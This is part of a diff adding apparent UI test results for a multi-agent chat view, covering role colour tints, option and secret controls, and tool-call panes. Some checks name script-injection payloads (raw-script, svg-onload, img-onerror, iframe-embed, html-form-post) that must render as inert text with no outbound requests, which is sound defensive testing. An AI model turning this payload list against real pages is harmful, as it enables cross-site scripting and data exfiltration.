+      "expected": "rgb(28, 115, 133)"
+    },
+    {
+      "name": "light — planner's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — builder has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — builder paints --fg-roleBgbuilder (#ecf1fb)",
+      "ok": true,
+      "actual": "rgb(236, 241, 251)",
+      "expected": "rgb(236, 241, 251)"
+    },
+    {
+      "name": "light — builder's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(44, 98, 212)",
+      "expected": "rgb(44, 98, 212)"
+    },
+    {
+      "name": "light — builder's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — reviewer has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — reviewer paints --fg-roleBgreviewer (#f3f2ea)",
+      "ok": true,
+      "actual": "rgb(243, 242, 234)",
+      "expected": "rgb(243, 242, 234)"
+    },
+    {
+      "name": "light — reviewer's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(127, 108, 17)",
+      "expected": "rgb(127, 108, 17)"
+    },
+    {
+      "name": "light — reviewer's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — researcher has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — researcher paints --fg-roleBgresearcher (#ecf3ee)",
+      "ok": true,
+      "actual": "rgb(236, 243, 238)",
+      "expected": "rgb(236, 243, 238)"
+    },
+    {
+      "name": "light — researcher's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(47, 122, 70)",
+      "expected": "rgb(47, 122, 70)"
+    },
+    {
+      "name": "light — researcher's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — scout has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — scout paints --fg-roleBgscout (#f3f3f4)",
+      "ok": true,
+      "actual": "rgb(243, 243, 244)",
+      "expected": "rgb(243, 243, 244)"
+    },
+    {
+      "name": "light — scout's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(108, 108, 116)",
+      "expected": "rgb(108, 108, 116)"
+    },
+    {
+      "name": "light — scout's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — steward has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — steward paints --fg-roleBgsteward (#f5eef6)",
+      "ok": true,
+      "actual": "rgb(245, 238, 246)",
+      "expected": "rgb(245, 238, 246)"
+    },
+    {
+      "name": "light — steward's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(142, 70, 160)",
+      "expected": "rgb(142, 70, 160)"
+    },
+    {
+      "name": "light — steward's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — tester has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — tester paints --fg-roleBgtester (#f8eded)",
+      "ok": true,
+      "actual": "rgb(248, 237, 237)",
+      "expected": "rgb(248, 237, 237)"
+    },
+    {
+      "name": "light — tester's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(178, 60, 57)",
+      "expected": "rgb(178, 60, 57)"
+    },
+    {
+      "name": "light — tester's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — every role's tint is DISTINCT (that is the whole feature)",
+      "ok": true,
+      "actual": 8,
+      "expected": 8
+    },
+    {
+      "name": "light — exactly one outbound echo",
+      "ok": true,
+      "actual": 1,
+      "expected": 1
+    },
+    {
+      "name": "light — the echo says \"to\"",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — the echo carries the arrow",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — the unstamped peer has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — ...and it says \"unknown role\" rather than guessing",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — ...and takes the neutral tint",
+      "ok": true,
+      "actual": "rgb(242, 242, 242)",
+      "expected": "rgb(242, 242, 242)"
+    },
+    {
+      "name": "light — no live node anywhere in the transcript",
+      "ok": true,
+      "actual": {
+        "script": 0,
+        "img": 0,
+        "iframe": 0,
+        "svg": 0,
+        "form": 0,
+        "style": 0,
+        "link": 0,
+        "object": 0,
+        "handler": 0,
+        "jsHref": 0,
+        "dataHref": 0,
+        "srcAttr": 0
+      },
+      "expected": {
+        "script": 0,
+        "img": 0,
+        "iframe": 0,
+        "svg": 0,
+        "form": 0,
+        "style": 0,
+        "link": 0,
+        "object": 0,
+        "handler": 0,
+        "jsHref": 0,
+        "dataHref": 0,
+        "srcAttr": 0
+      }
+    },
+    {
+      "name": "light — payload md-js-link is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload md-http-image is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload raw-img-onerror is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload raw-script is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload long-5000 is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload ansi-escapes is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload rtl-override is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload fake-marker is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload html-form-post is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload svg-onload is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload data-url-link is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload protocol-relative-image is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload iframe-embed is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — payload css-import is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — the escaped script tag is TEXT",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — the escaped img tag is TEXT",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — the image URL is shown as a marker, not loaded",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — the choice block renders two options",
+      "ok": true,
+      "actual": 2,
+      "expected": 2
+    },
+    {
+      "name": "light — and they are ENABLED here (the manager chat has a composer)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — the secret block renders",
+      "ok": true,
+      "actual": 1,
+      "expected": 1
+    },
+    {
+      "name": "light — nothing was mis-parsed into an invalid block",
+      "ok": true,
+      "actual": 0,
+      "expected": 0
+    },
+    {
+      "name": "light: screenshot (payload end of the thread)",
+      "note": "phase800-808-transcript-light.png"
+    },
+    {
+      "name": "light: screenshot (every role tint on one screen)",
+      "note": "phase800-808-roles-light.png"
+    },
+    {
+      "name": "ZERO requests to any injected host",
+      "ok": true,
+      "actual": [],
+      "expected": []
+    },
+    {
+      "name": "requests issued in total",
+      "note": 49
+    },
+    {
+      "name": "clicking an option writes its value into the composer",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "...and sends NOTHING",
+      "ok": true,
+      "actual": [],
+      "expected": []
+    },
+    {
+      "name": "...and adds no message to the transcript",
+      "ok": true,
+      "actual": 24,
+      "expected": 24
+    },
+    {
+      "name": "...and the option shows it was picked",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "the secret control opens the secure panel",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "...with an empty value field — no credential is ever pre-filled",
+      "ok": true,
+      "actual": "",
+      "expected": ""
+    },
+    {
+      "name": "...and no credential text entered the thread",
+      "ok": true,
+      "actual": false,
+      "expected": false
+    },
+    {
+      "name": "the streamed Bash call still renders a tool row",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "collapsed: no ARGS pane",
+      "ok": true,
+      "actual": false,
+      "expected": false
+    },
+    {
+      "name": "expanded: the ARGS pane appears",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "expanded: the RESULT pane appears",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "expanded: the payload is verbatim, not summarised",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "collapsing again hides it",
+      "ok": true,
+      "actual": false,
+      "expected": false
+    },
+    {
+      "name": "console errors",
+      "ok": true,
+      "actual": [],
+      "expected": []
+    },
+    {
+      "name": "failed requests",
+      "ok": true,
+      "actual": [],
+      "expected": []
+    }
+  ]
+}
